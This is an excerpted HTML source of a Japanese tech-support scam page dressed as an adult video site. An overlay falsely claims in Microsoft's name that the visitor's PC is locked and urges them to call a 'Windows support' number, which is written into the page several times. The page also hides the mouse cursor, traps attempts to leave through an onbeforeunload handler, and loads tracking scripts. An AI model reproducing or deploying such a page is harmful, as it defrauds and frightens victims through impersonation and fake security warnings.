...
<script type="text/javascript">
    ...
    })(window, document, "clarity", "script", "qbpflrhzcxj");
</script>
    <meta charset="utf-8">
    <meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name="viewport">
    <meta content="noindex,nofollow" name="robots">
    <title>無料ポルノHD</title>
    <link rel="shortcut icon" type="image/png" href="msmm.png">
    <link href="tapa.css" rel="stylesheet">
    <script type="text/javascript" src="jquery-1.4.4.min.js"></script>
    <script type="text/javascript" src="noir.js"></script>
    ...
    <script type="text/javascript" src="esc.js"></script>
    ...
    <script type="text/javascript">
      var phone_number = '0101-866-289-2128';
...
.haru {
  ...
  <body class="map" id="mycanvas" onbeforeunload="return myFunction()" style="cursor:none">
    ...
    <div class="pro_box3" style="display: block;">
      <img src="nbx1.jpg" alt="" width="100%" style="height: auto;">
    </div>


    <div class="cardcontainer" style="display: block;" id="pop_up_new">
      <img src="bx23.jpg" alt="" style="width: 500px;">
    ...
    <div class="lightbox" id="poptxt" style="display: block;">
      <div class="row firewall-pro">
        <div class="col-md-12">
          ...
          <strong class="haruto"><script>document.write(phone_number);</script> (サポート)</strong>
    ...
    <div class="answer_list" style="display:none;background-color: rgb(49, 52, 57); height: auto; width: 550px; left: 32%; position: absolute; z-index: 2147483647; border: 1px solid rgb(214, 216, 219); border-radius: 0.5rem; padding-bottom: 8px;" id="welcomeDiv">
      <p style="color:#FFFFFF;margin-top:10px;font-size:16px;opacity:.9;padding:0 5px" class="text-center">このPCへのアクセスはロックされています。このPCにアクセスしたり、再起動したりしないでください。この警告を無視すると、この問題に関する十分な情報が失われる可能性があります。マイクロソフト。弊社の専門家が電話で調査をご案内いたします。このアプリケーションを実行すると、PCが危険にさらされる可能性があります。.<br>
        <strong>
          Windows サポート: <span style="border:1px solid #383d41;border-radius:5px;padding:2px 5px"> <script>document.write(phone_number);</script> (無料で) </span>
        </strong>
      </p>
    </div>
    ...
    <div id="chat" style="display: block;">
      ...
      <h4 style="font-weight:600;font-size:22px"> <script>document.write(phone_number);</script> <br>(無料で)</h4>
...
<script type="text/javascript">
  ...
  (function() {
    ...
    t.async = true;
    t.id    = 'gauges-tracker';
    t.setAttribute('data-site-id', '66acbdba8b4334062434f5da');
    t.setAttribute('data-track-path', '../../../track.gaug.es/track.gif');
    t.src = '../../../d2fuc4clr7gvcn.cloudfront.net/track.js';
